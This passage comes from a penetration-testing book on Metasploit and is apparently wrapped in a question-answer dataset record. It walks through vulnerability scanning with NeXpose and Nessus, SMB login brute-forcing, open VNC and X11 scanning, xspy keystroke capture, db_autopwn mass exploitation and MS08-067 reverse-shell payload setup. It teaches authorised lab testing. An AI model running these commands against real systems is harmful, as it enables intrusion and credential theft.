delete any\nexisting database with db_destroy, create a new database in Metasploit with\ndb_connect, and then load the NeXpose plug-in with load nexpose as shown next:\nmsf > db_destroy postgres:toor@127.0.0.1/msf3\n[*] Warning: You will need to enter the password at the prompts below\nPassword:\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nmsf > load nexpose\n[*] NeXpose integration has been activated\n[*] Successfully loaded plugin: nexpose\nWith the NeXpose plug-in loaded, have a look at the commands loaded\nspecifically for the vulnerability scanner by entering the help command. You\nshould see a series of new commands at the top of the listing specific to run-\nning NeXpose.\nmsf > help\nBefore running your first scan from msfconsole, you will need to connect\nto your NeXpose installation. Enter nexpose_connect -h to display the usage\nrequired to connect; add your username, password, and host address; and\naccept the SSL certificate warning by adding ok to the end of the connect\nstring:\nmsf > nexpose_connect -h\n[*] Usage:\n[*] nexpose_connect username:password@host[:port] <ssl-confirm>\n[*] -OR-\n[*] nexpose_connect username password host port <ssl-confirm>\nmsf > nexpose_connect dookie:s3cr3t@192.168.1.206 ok\n[*] Connecting to NeXpose instance at 192.168.1.206:3780 with username dookie...\nNow enter nexpose_scan followed by the target IP address to initiate a scan, as\nshown next. In this example, we are scanning a single IP address, but you\nVulnerability Scanning 43\ncould also pass a range of hosts to the scanner (192.168.1.1-254) or a subnet\nin Classless Inter-Domain Routing (CIDR) notation (192.168.1.0/24).\nmsf > nexpose_scan 192.168.1.195\n[*] Scanning 1 addresses with template pentest-audit in sets of 32\n[*] Completed the scan of 1 addresses\nmsf >\nAfter the NeXpose scan completes, the database you created earlier\nshould contain the results of the vulnerability scan. To view the results, enter\ndb_hosts, as shown next. (In this example, the output has been trimmed by filter-\ning on the address column.)\nmsf > db_hosts -c address\nHosts\n=====\naddress Svcs Vulns Workspace\n------- ---- ----- ---------\n192.168.1.195 8 7 default\nmsf >\nAs you can see, NeXpose has discovered seven vulnerabilities. Run db_vulns\nto display the vulnerabilities found:\nmsf > db_vulns\nAlthough this scan has found significantly fewer than the 268 vulnerabilities\ndiscovered with our prior use of NeXpose through the GUI with credentials,\nyou should have enough vulnerabilities here to get a great head start on\nexploiting the system.\nScanning with Nessus\nThe Nessus vulnerability scanner from Tenable Security (http://www.tenable\n.com/) is one of the most widely used vulnerability scanners. Metasploit’s\nNessus plug-in lets you launch scans and pull information from Nessus scans\nvia the console, but in the example that follows, we’ll import Nessus scan\nresults independently. Using Nessus 4.4.1 with a free Home Feed, we’ll run\nthis scan against the same target we’ll use throughout this chapter, with\nknown credentials. In these early stages of a penetration test, the more\ntools you can use to fine-tune your future attacks, the better.\nNessus Configuration\nAfter you have downloaded and installed Nessus, open your web browser and\nnavigate to https://<youripaddress>:8834, accept the certificate warning, and\nlog into Nessus using the credentials you created during installation. You\nshould see the main Nessus window, as shown in Figure 4-11.\n44 Chapter 4\nFigure 4-11: The main Nessus window\nOn login, you will see the Reports section, where any prior vulnerability\nscans should be listed. Along the top of the interface, you should see the Scans\ntab, where you can create and view scanning tasks; the Policies tab, where you\nconfigure Nessus to include various plug-ins you want to use in your scans;\nand the Users tab, where you can add user accounts to the Nessus server.\nCreating a Nessus Scan Policy\nBefore beginning a scan, you first need to create a Nessus scan policy. On the\nPolicies tab, click the green Add button to open the policy configuration win-\ndow shown in Figure 4-12.\nFigure 4-12: The Nessus Policies configuration window\nVulnerability Scanning 45\nYou’ll see many available options, all of which can be found in Nessus’s\ndocumentation.\n1. Enter a name for the scan, as shown in Figure 4-13. We will use the name\nThe_Works in our example to have Nessus run all of its checks. Then\nclick Next.\n2. As with the NeXpose scan conducted earlier, we will configure this scan\nto use Windows login credentials to get a more complete picture of the\nvulnerabilities present on the target system. Enter the login credentials\nfor your target system and click Next.\nFigure 4-13: The Nessus General settings\n3. On the Plugins page, you can choose from a large variety of Nessus plug-\nins for Windows, Linux, BSD, and more. If, during a scan, you know you\nare going to scan only Windows-based systems, for example, you could\ndeselect many of these plug-ins for your first run-through; for now, click\nEnable All (shown in the lower-right corner of Figure 4-14) and then\nclick Next.\nFigure 4-14: Selecting Nessus scan plug-ins\n46 Chapter 4\n4. The final step in setting up the new policy is the Preferences page. Here,\nyou can direct Nessus not to scan fragile devices such as network printers,\nconfigure it to store results in an external database, provide login creden-\ntials, and more. When you are done with your selections, click Submit to\nsave the new policy. Your newly added policy should be displayed under\nPolicies, as shown in Figure 4-15.\nFigure 4-15: The newly added policy in Nessus\nRunning a Nessus Scan\nAfter you have created a scan policy, you are ready to configure a scan. Begin\nby selecting the Scans tab, and then click the Add button to open the scan\nconfiguration window. Most Nessus configuration is set in its scan policies, so\nwhen you’re setting up a scan, enter a name for the scan, choose a policy, and\nenter the scan targets, as shown in Figure 4-16.\nFigure 4-16: Configuring a Nessus scan\nIn our example, we are scanning only one host, but you can also enter IP\naddress ranges in CIDR notation or even upload a file containing the addresses\nof the targets you want to scan. When you are satisfied with the scan configu-\nration, click Launch Scan.\nNessus Reports\nAfter the scan is complete, it will no longer appear under Scans, and you\nshould find a new entry under the Reports tab listing the name of the scan,\nits status, and when it was last updated. Select the report and click Browse to\nVulnerability Scanning 47\nopen a summary page of the scan that shows the severity levels of the vulner-\nabilities found, as shown in Figure 4-17.\nFigure 4-17: Our Nessus scan report summary\nNOTE Bear in mind that because this scan was run with Windows credentials, Nessus will\nfind many more vulnerabilities than it would with an anonymous scan.\nImporting Results into the Metasploit Framework\nNow let’s import our results into the Framework.\n1. Click the Download Report button on the Reports tab to save the results\nto your hard drive. The default file format for Nessus reports, .nessus, can\nbe parsed by Metasploit, so click Submit when prompted to select the\ndefault format.\n2. Load msfconsole, create a new database with db_connect, and import the\nNessus results file by entering db_import followed by the report filename.\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nmsf > db_import /tmp/nessus_report_Host_195.nessus\n[*] Importing 'Nessus XML (v2)' data\n[*] Importing host 192.168.1.195\n3. To verify that the scanned host and vulnerability data was imported\nproperly, enter db_hosts as shown next. This should output a brief list-\ning with the target IP address, the number of services detected, and the\nnumber of vulnerabilities found by Nessus.\nmsf > db_hosts -c address,svcs,vulns\nHosts\n=====\naddress svcs vulns\n------- ---- -----\n192.168.1.195 18 345\n48 Chapter 4\n4. For a complete listing of the vulnerability data that was imported into\nMetasploit, enter db_vulns without any switches, as shown here:\nmsf > db_vulns\n[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195\nname=NSS-10916 refs=OSVDB-755\n[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195\nname=NSS-10915 refs=OSVDB-754\n[*] Time: Wed Mar 09 03:40:11 UTC 2011 Vuln: host=192.168.1.195\nname=NSS-10913 refs=OSVDB-752\n[*] Time: Wed Mar 09 03:40:12 UTC 2011 Vuln: host=192.168.1.195\nname=NSS-10114 refs=CVE-1999-0524,OSVDB-94,CWE-200\n[*] Time: Wed Mar 09 03:40:13 UTC 2011 Vuln: host=192.168.1.195\nname=NSS-11197 refs=CVE-2003-0001,BID-6535\nAt the end of your pen test, having these references available can be of\ngreat assistance when you’re writing the report for your client.\nScanning with Nessus from Within Metasploit\nDuring those times when you don’t feel like leaving the comfort of the\ncommand line, you can use the Nessus Bridge plug-in (http://blog.zate.org/\nnessus-plugin-dev/) by Zate within Metasploit. The Nessus Bridge allows you to\ncontrol Nessus completely through the Metasploit Framework, run scans,\ninterpret results, and launch attacks based on the vulnerabilities identified\nthrough Nessus.\n1. As in the preceding examples, first destroy the existing database with the\ndb_destroy command and create a new one using db_connect.\n2. Load the Nessus plug-in by running load nessus, as shown here:\nmsf > db_destroy postgres:toor@127.0.0.1/msf3\n[*] Warning: You will need to enter the password at the prompts below\nPassword:\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nmsf > load nessus\n[*] Nessus Bridge for Metasploit 1.1\n[+] Type nessus_help for a command listing\n[+] Exploit Index - (/root/.msf3/nessus_index) - is valid.\n[*] Successfully loaded plugin: Nessus\n3. Running the command nessus_help will display all of the commands that\nthe plug-in supports. The Bridge undergoes regular development and\nupdates, so it is a good idea to check the help output periodically to see\nwhat new features, if any, have been added.\nVulnerability Scanning 49\n4. Before starting a scan with the Bridge, you first need to authenticate to\nyour Nessus server using nessus_connect, as shown here:\nmsf > nessus_connect dookie:s3cr3t@192.168.1.101:8834 ok\n[*] Connecting to https://192.168.1.101:8834/ as dookie\n[*] Authenticated\n5. As with the GUI version of Nessus, you need to initiate a scan using a\ndefined policy by its policy ID number. To list the available scan policies\non the server, use nessus_policy_list:\nmsf > nessus_policy_list\n[+] Nessus Policy List\nID Name Comments\n-- ---- --------\n-4 Internal Network Scan\n-3 Web App Tests\n-2 Prepare for PCI DSS audits\n-1 External Network Scan\n2 The_Works\n6. Take note of the policy ID you want to use for your scan, and then launch\na new scan with nessus_scan_new followed by the policy number, a name\nfor your scan, and your target IP address as shown next:\nmsf > nessus_scan_new\n[*] Usage:\n[*] nessus_scan_new <policy id> <scan name> <targets>\n[*] use nessus_policy_list to list all available policies\nmsf > nessus_scan_new 2 bridge_scan 192.168.1.195\n[*] Creating scan from policy number 2, called \"bridge_scan\" and scanning 192.168.1.195\n[*] Scan started. uid is d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e\n7. While your scan is in progress, you can see its status by running the\nnessus_scan_status command. When this command’s output responds\nwith “No Scans Running,” as shown next, you will know that your scan\nhas completed.\nmsf > nessus_scan_status\n[*] No Scans Running.\n8. After the scan has completed, you can list the available scan reports with\nthe nessus_report_list command. Identify the ID of the report you want\nto import and enter nessus_report_get to download the report and import\nit into the Metasploit database automatically.\nmsf > nessus_report_list\n[+] Nessus Report List\n50 Chapter 4\nID Name Status Date\n-- ---- ------ ----\n074dc984-05f1-57b1-f0c9-2bb80ada82fd3758887a05631c1d Host_195 completed 19:43 Mar 08 2011\nd2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e bridge_scan completed 09:37 Mar 09 2011\n[*] You can:\n[*] Get a list of hosts from the report: nessus_report_hosts <report id>\nmsf > nessus_report_get d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e\n[*] importing d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e\n[*] 192.168.1.195 Microsoft Windows XP Professional (English) Done!\n[+] Done\n9. Finally, as with the other import functions demonstrated in this chapter,\nyou can use db_hosts to verify that the scan data was imported successfully:\nmsf > db_hosts -c address,svcs,vulns\nHosts\n=====\naddress svcs vulns\n------- ---- -----\n192.168.1.195 18 345\nNow that you’ve seen the variation in scan results from two different\nproducts, you should have a better sense of the merit in using more than one\ntool for your scanning needs. It is still up to the penetration tester to interpret\nthe results from these automated tools and turn them into actionable data.\nSpecialty Vulnerability Scanners\nAlthough many commercial vulnerability scanners are available on the market,\nyou are not limited to them. When you want to run a scan for a specific vul-\nnerability across a network, Metasploit’s many auxiliary modules can help\nyou accomplish such tasks.\nThe following Metasploit modules are just a few examples of the many\nuseful auxiliary scanning modules included in the Framework. Take advan-\ntage of your lab to probe and explore as many of them as you can.\nValidating SMB Logins\nTo check the validity of a username and password combination, use the SMB\nLogin Check Scanner to connect to a range of hosts. As you might expect,\nthis scan is loud and noticeable, and each login attempt will show up in the\nevent logs of every Windows box it encounters.\nAfter selecting the smb_login module with use, you can run show_options to\nsee the settings listed under the Required column. Metasploit allows you to\nspecify a username and password combination, a username and password list,\nor a combination of either. In the next example, RHOSTS is set to a small range\nof IP addresses and a username and password are configured for Metasploit\nto try against all addresses.\nVulnerability Scanning 51\nmsf > use auxiliary/scanner/smb/smb_login\nmsf auxiliary(smb_login) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASS_FILE no File containing passwords, one per line\nRHOSTS yes The target address range or CIDR identifier\nRPORT 445 yes Set the SMB service port\nSMBDomain WORKGROUP no SMB Domain\nSMBPass password no SMB Password\nSMBUser Administrator no SMB Username\nTHREADS 50 yes The number of concurrent threads\nUSERPASS_FILE no File containing users and passwords separated\nby space, one pair per line\nUSER_FILE no File containing usernames, one per line\nmsf auxiliary(smb_login) > set RHOSTS 192.168.1.150-155\nRHOSTS => 192.168.1.170-192.168.1.175\nmsf auxiliary(smb_login) > set SMBUser Administrator\nSMBUser => Administrator\nmsf auxiliary(smb_login) > set SMBPass s3cr3t\nSMBPass => s3cr3t\nmsf auxiliary(smb_login) > run\n[*] Starting host 192.168.1.154\n[*] Starting host 192.168.1.150\n[*] Starting host 192.168.1.152\n[*] Starting host 192.168.1.151\n[*] Starting host 192.168.1.153\n[*] Starting host 192.168.1.155\n(cid:88) [+] 192.168.1.155 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'\n[*] Scanned 4 of 6 hosts (066% complete)\n[*] Scanned 5 of 6 hosts (083% complete)\n[*] Scanned 6 of 6 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_login) >\nYou can see a successful login with user Administrator and a password of\ns3cr3t at (cid:88). Because workstations are all cloned from one image and deployed\nthrough the enterprise in many corporate environments, the administrator\npassword may well be the same on all of them, granting you access to every\nworkstation on the network.\nScanning for Open VNC Authentication\nVirtual network computing (VNC) provides graphical access to remote sys-\ntems in a way that’s similar to Microsoft’s Remote Desktop. VNC installations\nare common throughout corporations, because they provide a GUI-based\nview of server and workstation desktops. VNC is frequently installed to meet a\ntemporary need and then completely forgotten and left unpatched, creating\n52 Chapter 4\na major potential vulnerability. Metasploit’s built-in VNC Authentication\nNone scanner searches a range of IP addresses for VNC servers that do not\nhave a password configured (that support “None” authentication, meaning a\nblank password). Usually, this scan will turn up nothing of value, but a good\npenetration tester leaves no stone unturned when looking for ways access a\ntarget system.\nNOTE Recent VNC servers do not allow blank passwords. To set one up in your lab for testing,\nuse older VNC servers such as RealVNC 4.1.1.\nThe VNC scanner, like most Metasploit auxiliary modules, is easy to con-\nfigure and run. The only required configuration for vnc_none_auth is to supply\nit with an IP or a range of IPs to scan. Simply select the module, define your\nRHOSTS and THREADS, if desired, and run it, as shown next:\nmsf > use auxiliary/scanner/vnc/vnc_none_auth\nmsf auxiliary(vnc_none_auth) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOSTS yes The target address range or CIDR identifier\nRPORT 5900 yes The target port\nTHREADS 1 yes The number of concurrent threads\nmsf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.155\nRHOSTS => 192.168.1.155\nmsf auxiliary(vnc_none_auth) > run\n[*] 192.168.1.155:5900, VNC server protocol version : RFB 003.008\n[*] 192.168.1.155:5900, VNC server security types supported : None\n(cid:88) [*] 192.168.1.155:5900, VNC server security types includes None, free access!\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(vnc_none_auth) >\nIf you get lucky and Metasploit finds a VNC server with no authentica-\ntion (cid:88), you can use Back|Track’s vncviewer to connect to the target machine\nwithout a password, as shown in Figure 4-18.\nFigure 4-18: Connecting to VNC with no authentication using vncviewer\nVulnerability Scanning 53\nIf you think a VNC scan is likely to be a waste of time and that you’ll never\nfind systems with open VNC servers enabled, think again. During a large\npenetration test, which included thousands of systems, one of the authors\nnoticed that one of those systems had an open VNC server.\nWhile the author was in the system documenting his finding, he noticed\nactivity on the system. This was overnight on a system that was unlikely to\nhave an authorized user on it. While not always considered a best practice,\nthe author pretended to be another unauthorized intruder and engaged the\nintruder in conversation via Notepad. The intruder was not very bright and\ntold the author that he was scanning large blocks of systems for open VNC\nservers. Here is a segment of the conversation:\nAuthor: You in the us? or out of country? I know some people\nindenmark.\nAttacker: I’m from Norway actually, hehe, I have relatives\ninDenmark.\nAuthor: You hang in any boards? like I used to like some but they\nhave been going away\nAttacker: I mostly hang in some programming boards, but not much\nelse. Have you been into hacking for a long time or what? What’s\nyour age btw? I’m 22.\nAuthor: I have been on this for like fun for around a year or so. Still\nin school. 16. Just something to do.\nAttacker: Haven’t been there. I too mostly do this for fun, just trying\nto see what I can do, test my skills. I wrote the “VNC finder” myself\nbtw, I have found a lot of servers, but this is the only one where I\ncould actually have some fun\nAuthor: Wow. What did you write it in? Can I dl it? Do you have\nahandle?\nAttacker: It’s written in a language called PureBasic, but it’s kinda\nnot ready for release yet, it’s only for my own use. But maybe I can\nshare it anyway, I could upload the code somewhere and let you\ncompile it. That is if you can find some PureBasic compiler on\nsome warez site :P\nAuthor: Thats cool. you can put it in that pastebin site from irc.\nThat lets you anon post I have not done purebasic before. just\npython and perl\nAttacker: Let me see, I'll look for that pastebin site and upload it,\njust give me some minutes, I’ll be around.\nThe attacker then gave the author a link to a pastebin page with the full\nsource for the custom VNC scanner he was using.\nScanning for Open X11 Servers\nMetasploit’s built-in open_x11 scanner is similar to the vnc_auth scanner,\ninthat it scours a range of hosts for X11 servers that allow users to connect\nwithout authentication. Although X11 servers aren’t widely used today, lots\n54 Chapter 4\nof archaic boxes out there are still running old, unpatched, and forgotten\noperating systems. As you’ve seen in the preceding two examples, legacy sys-\ntems are often the most vulnerable systems on a network.\nTo run the open_x11 scanner, simply configure as you would most other\nauxiliary modules by setting the RHOSTS and, optionally, the THREADS values. A\nsession is shown next. Notice at IP address 192.168.1.23 that the scanner has\nfound an open X server. This is a serious vulnerability because it allows an\nattacker to gain unauthenticated access to the system: The X system handles\nthe GUI including the mouse and keyboard.\nmsf > use auxiliary/scanner/x11/open_x11\nmsf auxiliary(open_x11) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOSTS yes The target address range or CIDR identifier\nRPORT 6000 yes The target port\nTHREADS 1 yes The number of concurrent threads\nmsf auxiliary(open_x11) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(open_x11) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(open_x11) > run\n[*] Trying 192.168.1.1\n[*] Trying 192.168.1.0\n[*] Trying 192.168.1.2...\n[*] Trying 192.168.1.29\n[*] Trying 192.168.1.30\n[*] Open X Server @ 192.168.1.23 (The XFree86 Project, Inc)\n[*] Trying 192.168.1.31\n[*] Trying 192.168.1.32\n. . . SNIP . . .\n[*] Trying 192.168.1.253\n[*] Trying 192.168.1.254\n[*] Trying 192.168.1.255\n[*] Auxiliary module execution completed\nTo see what an attacker could do with a vulnerability like this, start key-\nstroke logging using Back|Track’s xspy tool, like so:\nroot@bt:/# cd /pentest/sniffers/xspy/\nroot@bt:/pentest/sniffers/xspy# ./xspy -display 192.168.1.23:0 -delay 100\nssh root@192.168.1.11(+BackSpace)37\nsup3rs3cr3tp4s5w0rd\nifconfig\nexit\nVulnerability Scanning 55\nThe xspy tool remotely sniffs the X server’s keyboard session and has cap-\ntured a user running SSH to log in as root on a remote system. Vulnerabilities\nsuch as this can be rare, but when you find them they are extremely valuable.\nUsing Scan Results for Autopwning\nLet’s take a quick diversion into exploitation. Metasploit’s Autopwn tool auto-\nmatically targets and exploits a system using an open port or using the results\nof a vulnerability scan export. You can use Autopwn to harness the results of\nmost vulnerability scanners, including NeXpose, Nessus, and OpenVAS.\nFor example, here’s how we could use a Nessus results import to target a\nsystem and autopwn it. Create a new database with db_connect and use db_import\nto import the scan report. In the next example, we run db_autopwn with a\nseries of switches to launch attacks against all targets (e), show all matching\nmodules (t), use a reverse shell payload (r), select exploit modules based on\nvulnerability (x), and also select based on open ports (p). Once db_autopwn\nlaunches, Metasploit begins launching exploits at the targets. Successful\nexploits return a shell to the attacking machine.\nmsf > db_connect postgres:toor@127.0.0.1/msf3\nmsf > db_import /root/nessus.nbe\nmsf > db_autopwn –e –t –r -x -p\n(cid:88) [*] (1/72 [0 sessions]): Launching exploit/windows/mssql/ms09_004_sp_replwritetovarbin\nagainst 192.168.33.130:1433...\n[*] (2/72 [0 sessions]): Launching exploit/windows/smb/psexec against 192.168.33.130:445...\n[*] (3/72 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against\n192.168.33.130:445...\n. . . SNIP . . .\n[*] Transmitting intermediate stager for over-sized stage...(216 bytes)\n[*] Sending stage (718336 bytes)\n(cid:89) [*] Meterpreter session 1 opened (192.168.1.101:40912 -> 192.168.1.115:15991)\n[*] (72/72 [1 sessions]): Waiting on 2 launched modules to finish execution...\n[*] (72/72 [1 sessions]): Waiting on 0 launched modules to finish execution...\nBased on these scans, Autopwn launched 72 exploits (cid:88) and one was suc-\ncessful, as shown at (cid:89). This exploit allows us full access to the machine with a\nMeterpreter console that will be discussed in far more depth in Chapter 6.\nNOTE One big caveat to remember when using Autopwn: If you’re going in with your Autopwn\nguns blazing, the target system can crash or lose stability. Autopwn has useful features\nnot covered here, such as the ability to select only exploits that have an “Excellent” rank-\ning, meaning it is very unlikely they will crash the remote system or service. For more\ninformation on its usage, enter db_autopwn –h.\n56 Chapter 4"
  },
  {
    "input": "What are the key steps and commands involved in using the Metasploit Framework to exploit a system and gain access to it?",
    "summary": "The chapter discusses the basics of exploitation using the Metasploit Framework, focusing on tools like msfconsole, msfencode, and msfpayload. It explains how to search for exploits, set options, and use payloads to gain access to a target system. The text also covers the use of resource files to automate tasks and the specific steps for exploiting a system with the MS08-067 vulnerability. Finally, it highlights the importance of understanding system versions and configurations when choosing the right exploit and payload.",
    "output": "T H E J O Y O F E X P L O I T A T I O N\nExploitation is the pinnacle of many security profes-\nsionals’ careers. The ability to gain full control over a\ntargeted machine is a great feeling, if perhaps a little\nscary. But even though exploitation techniques have\nadvanced quite a bit over the years, the adoption of\nvarious system and network protections has made it\nincreasingly more difficult to succeed with basic exploits. In this chapter,\nwemove into more difficult attack methods, beginning with command-line\ninterfaces to the Metasploit Framework. Most of the attacks and customizations\ndiscussed in this chapter will occur in msfconsole, msfencode, and msfpayload.\nBefore you begin to exploit systems, you need to understand a few\nthingsabout penetration testing and exploitation. In Chapter 1 you were\nintroduced to basic penetration testing methods. In Chapter 2 you learned\nthe basics of the Framework and what to expect from each tool. In Chapter 3\nwe explored the intelligence gathering phase, and in Chapter 4 you learned\nabout vulnerability scanning.\nIn this chapter, we focus on the basics of exploitation. Our goal is to\nfamiliarize you with the different commands available through the Frame-\nwork, which we’ll build upon in later chapters. Most of the attacks from this\npoint forward will occur through msfconsole, and you will need a solid under-\nstanding of msfconsole, msfpayload, and msfencode to get the most out of the\nbalance of this book.\nBasic Exploitation\nThe Metasploit Framework contains hundreds of modules, and it’s nearly\nimpossible to remember them all. Running show from msfconsole will display\nevery module available in the Framework, but you can also narrow your search\nby displaying only specific types of modules as discussed in the following\nsections.\nmsf> show exploits\nWithin msfconsole, exploits operate against the vulnerabilities that you dis-\ncover during a penetration test. New exploits are always being developed,\nand the list will continue to grow. This command will display every currently\navailable exploit within the Framework.\nmsf> show auxiliary\nAuxiliary modules in Metasploit can be used for a wide range of purposes.\nThey can operate as scanners, denial-of-service modules, fuzzers, and much\nmore. This command will display them and list their features.\nmsf> show options\nOptions control various settings needed for proper functionality of the\nFramework modules. When you run show options while a module is selected,\nMetasploit will display only the options that apply to that particular module.\nEntering msf> show options when not in a module will display the available\nglobal options—for example, you can set LogLevel to be more verbose as you\nperform an attack. You can also issue the back command to go back once\ninside a module.\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > back\nmsf >\nThe search command is useful for finding a specific attack, auxiliary\nmodule, or payload. For example, if you want to launch an attack against\nSQL, you could search for SQL like this:\nmsf > search mssql\n[*] Searching loaded modules for pattern 'mssql'...\n58 Chapter 5\nAuxiliary\n=========\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\nadmin/mssql/mssql_enum normal Microsoft SQL Server Configuration\nEnumerator\nadmin/mssql/mssql_exec normal Microsoft SQL Server xp_cmdshell\nCommand Execution\nadmin/mssql/mssql_idf normal Microsoft SQL Server - Interesting\nData Finder\nadmin/mssql/mssql_sql normal Microsoft SQL Server Generic Query\nscanner/mssql/mssql_login normal MSSQL Login Utility\nscanner/mssql/mssql_ping normal MSSQL Ping Utility\nExploits\n. . . SNIP . . .\nmsf >\nOr, to find the MS08-067 exploit specifically (an exploit related to the\nnotorious Conficker worm that exploited a weakness within the Remote\nProcedure Call [RPC] service), you would enter this command:\nmsf > search ms08_067\n[*] Searching loaded modules for pattern 'ms08_067'...\nExploits\n========\nName Rank Description\n---- ---- -----------\nwindows/smb/ms08_067_netapi great Microsoft Server Service Relative Path Stack Corruption\nThen, having found an exploit (windows/smb/ms08_067_netapi), you could\nload the found module with the use command, like so:\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) >\nNotice that when we issue the use windows/smb/ms08_067_netapi command,\nthe msf prompt changes as follows:\nmsf exploit(ms08_067_netapi) >\nThis indicates that we have selected the ms08_067_netapi module and\nthat commands issued at this prompt will be performed under that exploit.\nThe Joy of Exploitation 59\nNOTE You can perform a search or use at any time within an exploit to switch to a different\nexploit or module.\nNow, with the prompt reflecting our chosen module, we can enter show\noptions to display the options specific to the MS08-067 exploit:\nmsf exploit(ms08_067_netapi) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nExploit target:\nId Name\n-- ----\n0 Automatic Targeting\nmsf exploit(ms08_067_netapi) >\nThis contextual approach to accessing options keeps the interface simpler\nand allows you to focus only on the options that matter at the moment.\nmsf> show payloads\nRecall from Chapter 2 that payloads are platform-specific portions of code\ndelivered to a target. As with show options, when you run show payloads from a\nmodule-specific prompt, Metasploit displays only the payloads that are com-\npatible with that module. In the case of Microsoft Windows–based exploits,\nthese payloads may be as simple as a command prompt on the target or as\ncomplex as a full graphical interface on the target machine. To see an active\nlist of payloads, run the following command:\nmsf> show payloads\nThis would show you all payloads available in Metasploit; however, if you\nare in an actual exploit, you will see only payloads applicable to the attack.\nFor example, running show payloads from the msf exploit(ms08_067_netapi)\nprompt would result in the output shown next.\nIn the previous example we searched for the MS08-067 module. Now\nlet’s find out the payloads for that module by entering show payloads. Notice\nin the example that only Windows-based payloads are shown. Metasploit\nwill generally identify the type of payloads that can be used with a particu-\nlar attack.\n60 Chapter 5\nmsf exploit(ms08_067_netapi) > show payloads\nCompatible Payloads\n===================\nName Rank Description\n---- ---- -----------\n. . . SNIP . . .\nwindows/shell/reverse_ipv6_tcp normal Windows Command Shell, Reverse TCP\nStager (IPv6)\nwindows/shell/reverse_nonx_tcp normal Windows Command Shell, Reverse TCP\nStager (No NX or Win7)\nwindows/shell/reverse_ord_tcp normal Windows Command Shell, Reverse\nOrdinal TCP Stager (No NX or Win7)\nwindows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP\nStager\nwindows/shell/reverse_tcp_allports normal Windows Command Shell, Reverse\nAll-Port TCP Stager\nwindows/shell_bind_tcp normal Windows Command Shell, Bind TCP\nInline\nwindows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP\nInline\nNext, we enter set payload windows/shell/reverse_tcp to select the reverse_tcp\npayload. When we enter show options again we see that additional options\nare shown:\nmsf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp (cid:88)\npayload => windows/shell/reverse_tcp\nmsf exploit(ms08_067_netapi) > show options (cid:89)\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\n(cid:90) Payload options (windows/shell/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process\nLHOST yes The local address\nLPORT 4444 yes The local port\nThe Joy of Exploitation 61\nNotice that when the payload is selected at (cid:88) and the options are dis-\nplayed at (cid:89), we are presented with some additional options in the payload\nsection at (cid:90), such as LHOST and LPORT. In this example, you could configure\nthe payload to connect back to the attacker machine on a specific IP address\nand port number, called a reverse payload. In reverse payloads, the connection\nis actually triggered by the target machine and it connects to the attacker.\nYou might use this technique to circumvent a firewall or NAT installation.\nWe’ll configure this exploit with both the LHOST and RHOST options. LHOST,\nour attacking machine, will connect back from the target machine (RHOST) on\nthe default TCP port (4444).\nmsf> show targets\nModules often list vulnerable potential targets. For example, because the vul-\nnerability targeted by MS08-067 relies on hard-coded memory addresses, the\nexploit is specific to operating systems with specific patch levels, language\nversion, and security implementations (as explained in detail in Chapters 14\nand 15). Using the show targets command at the msf MS08-067 prompt displays\na list of 60 exploit targets (with only a portion shown in the following exam-\nple). The success of the exploit will depend on the version of Windows you\nare targeting. Sometimes automatic detection will not work and could even\ntrigger the wrong exploit, which will usually lead to a service crash.\nmsf exploit(ms08_067_netapi) > show targets\nExploit targets:\nId Name\n-- ----\n(cid:88) 0 Automatic Targeting\n1 Windows 2000 Universal\n2 Windows XP SP0/SP1 Universal\n3 Windows XP SP2 English (NX)\n4 Windows XP SP3 English (NX)\n5 Windows 2003 SP0 Universal\n6 Windows 2003 SP1 English (NO NX)\n7 Windows 2003 SP1 English (NX)\n8 Windows 2003 SP2 English (NO NX)\n9 Windows 2003 SP2 English (NX)\nIn this example, you can see that the exploit lists Automatic Targeting (cid:88)\nas one option. Often, an exploit module will attempt to target the operating\nsystem automatically based on its version and select an exploit based on the\nsystem’s fingerprint. However, it’s often best to try to identify the appropriate\nexploit yourself to avoid triggering the wrong exploit or a potentially destruc-\ntive one.\nNOTE This particular exploit is temperamental, and it has a tough time determining the oper-\nating system. If you use this exploit, be sure to set the target as the specific operating system\nyou use in testing on your VM (Windows XP SP2).\n62 Chapter 5\ninfo\nWhen the short description of a module provided by the show and search com-\nmands isn’t sufficient, use the info command followed by the module name\nto display all the information, options, and targets available for that module:\nmsf exploit(ms08_067_netapi) > info\nset and unset\nAll the options for a given Metasploit module must be either set or unset,\nespecially if they are marked as required or yes. When you enter show options,\nyou will see information that specifies whether a field is required. Use the set\ncommand to set an option (turn it on); use unset to 